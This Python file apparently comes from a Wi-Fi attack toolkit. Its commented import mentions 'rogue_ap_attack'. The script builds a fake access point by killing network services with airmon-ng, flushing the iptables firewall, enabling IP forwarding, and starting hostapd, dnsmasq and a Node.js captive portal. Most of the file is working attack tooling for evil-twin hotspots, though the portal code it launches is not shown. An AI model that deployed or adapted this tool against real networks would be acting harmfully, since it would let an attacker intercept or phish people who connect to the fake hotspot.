import os
from threading import Thread

import tools
from pretty_print import pretty

# CONSTANTS:
DEV_NULL = ">/dev/null 2>&1"
apache_terminal = None


# Reset network settings to their default
def reset_network_settings():
    # Start system network services
    os.system('service NetworkManager start')
    os.system('service wpa_supplicant start')
    os.system('service avahi-daemon start')
    # Stop apache2 service
    os.system('service apache2 stop')
    # Stop and kill hostapd and dnsmasq services.
    os.system('service hostapd stop')  # hostapd (host access point daemon) for make access point
    os.system('service dnsmasq stop')  # dnsmasq is to make DNS and DHCP server
    os.system("killall dnsmasq " + DEV_NULL)
    os.system("killall hostapd " + DEV_NULL)
    # Enable and start the local DNS stub listener that uses port 53
    os.system("systemctl enable systemd-resolved.service " + DEV_NULL)
    os.system("systemctl start systemd-resolved " + DEV_NULL)


# Set up the fake access point settings.
def setup_fake_access_point(interface):
    # Disable and stop the local DNS stub listener that uses port 53.
    os.system("systemctl disable systemd-resolved.service " + DEV_NULL)
    os.system("systemctl stop systemd-resolved " + DEV_NULL)
    # Kills the network management software and interfering processes left
    os.system("airmon-ng check kill " + DEV_NULL)
    os.system("killall dnsmasq " + DEV_NULL)
    os.system("killall hostapd " + DEV_NULL)
    set_ap_ip = "ifconfig " + interface + " 10.0.0.1 netmask 255.255.255.0"
    os.system(set_ap_ip)
    # Define the default gateway.
    os.system('route add default gw 10.0.0.1')
    # Enable IP Forwarding (DISABLE=0, ENABLE=1)
    os.system('echo 1 > /proc/sys/net/ipv4/ip_forward')
    # Flush all chains of `filter` and `NAT` iptables (Linux FireWall utilities).
    os.system('iptables --flush')
    # Allowing packets that routed through the system (=FORWARD) to pass through.
    os.system('iptables -P FORWARD ACCEPT')


def run_fake_ap():
    # Use dnsmasq as a DHCP server.
    os.system('dnsmasq -C dnsmasq.conf')
    # Start a web server using a separate process (Shell).
    os.system('gnome-terminal -- sh -c "node html/index.js"')
    # Link hostapd to the configuration file.
    os.system('hostapd hostapd.conf -B')
    # os.system('route add default gw 10.0.0.1')


# Create the hostapd and dnsmasq configuration files.
def create_conf_files(interface, ssid):
    # Setting up configuration files:
    command = "python3 create_conf_files.py " + interface + " " + ssid
    os.system(command)


# Delete hostapd and dnsmasq configuration files.
def remove_conf_files():
    try:
        os.remove("dnsmasq.conf")
    except OSError:
        pass
    try:
        os.remove("hostapd.conf")
    except OSError:
        pass


def start(iface, ssid):
    os.system('clear')
    title = "===============================================================\n" \
            "====================== FAKE ACCESS POINT ======================\n" \
            "===============================================================\n"

    pretty(title)
    print(f"\n\t\tCreating Fake Hotspot: \"{ssid}\"...")
    pretty("\n\t\t\tPlease wait...\n")
    pretty('Setting up access point...\n')
    reset_network_settings()
    setup_fake_access_point(iface)
    print('Creating configuration files')
    create_conf_files(iface, ssid)
    print('Starting a captive portal on port 80')
    try:
        run_fake_ap()
    except Exception as e:
        pretty(f'Unfortunately something went wrong...')
        print(e)
    print(f'\n\t\"{ssid}\" is now a visible (Fake) Access Point!')
    input("\n\tPress enter to stop the fake AP and reset network settings\n")
    print("\nRestoring network settings...\n")
    remove_conf_files()
    reset_network_settings()
    print("Network settings were successfully restored!\nDone!\n")
    pretty("\nFake AP was shut down successfully!\n")
    # exit(0)


class FakeAP:
    def __init__(self, interface_name: str, ssid: str):
        self.iface = interface_name
        self.ssid = ssid
        # Create a thread which will run the fake AP in background
        self.ap = Thread(target=lambda: start(self.iface, self.ssid))

    def start(self):
        self.ap.start()


if __name__ == '__main__':
    # A simple Fake Access Point demo file
    # from rogue_ap_attack import choose_interface

    os.system('clear')
    nic = tools.choose_interface()
    # nic = nics[0]
    # pretty(f'Available NICs found on your machine:\n\n\t{nics}')

    # conf = input(f'Continue with `{nics[0]}`? [y/n] ')
    # if 'y' in conf:
    #     nic = nics[0]
    # elif 'n' in conf:
    #     nic = choose_interface()  # Wait for user input

    print('How to name the Fake AP?')
    ssid = input('Name (SSID): ')
    fake_ap = FakeAP(interface_name=nic, ssid=ssid)
    fake_ap.start()  # Start the fake access point in background
